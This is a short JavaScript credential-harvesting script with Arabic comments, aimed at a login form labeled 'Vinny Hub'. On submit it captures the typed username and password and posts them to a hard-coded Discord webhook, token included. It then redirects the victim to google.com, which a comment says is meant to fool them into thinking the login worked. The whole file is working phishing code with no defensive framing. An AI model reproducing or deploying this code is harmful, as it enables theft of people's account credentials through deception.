document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // منع الصفحة من إعادة التحميل

    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    
    // رابط الويب هوك الخاص بك
    const webhookURL = "https://discord.com/api/webhooks/1506925211197509686/Id43FcW2fb9nX7M_8enXQfhTwSUGUaPC4RWOKiF_tb1o1UrncBIBcSGi2RrTRJt4D3R1";

    const payload = {
        content: "New Login Attempt!",
        embeds: [{
            title: "Vinny Hub Login Details",
            fields: [
                { name: "Username", value: user, inline: true },
                { name: "Password", value: pass, inline: true }
            ],
            color: 3066993, // لون أخضر للإشعار
            timestamp: new Date()
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            // توجيه المستخدم لصفحة أخرى بعد الإرسال لإيهامه بأن العملية تمت
            window.location.href = "https://www.google.com"; 
        } else {
            console.error("Failed to send data.");
        }
    })
    .catch(error => console.error('Error:', error));
});
